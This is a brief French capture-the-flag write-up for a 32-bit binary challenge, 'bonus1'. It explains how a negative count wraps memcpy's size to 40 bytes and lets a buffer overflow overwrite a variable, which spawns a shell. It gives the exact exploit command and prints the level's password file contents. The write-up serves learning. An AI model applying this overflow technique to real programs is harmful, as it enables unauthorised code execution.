# Analyse du code

Le programme a une vulnérabilité de buffer overflow. Il copie count * 4 octets de argv[2] dans un tampon de 40 octets. Si count == 0x574f4c46, le programme exécute /bin/sh.

# Preparation du payload

memcpy prenant un size_t dans son dernier argument si nous mettons -2147483637 et vu que le programme est en 32bits quand il va overflow le nombre donneras 40.

A la suite de notre buffer nous avons la variable qui va sotcker la valeur de count. 
En surchargeant le buffer nous pouvons ecraser la valeur de count et lui donner ce la valeur que nous voulons. 

./bonus1 -2147483637 $(python -c "print('\x90' * 40 + '\x46\x4c\x4f\x57')")


# Exploit

cat /home/user/bonus1/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245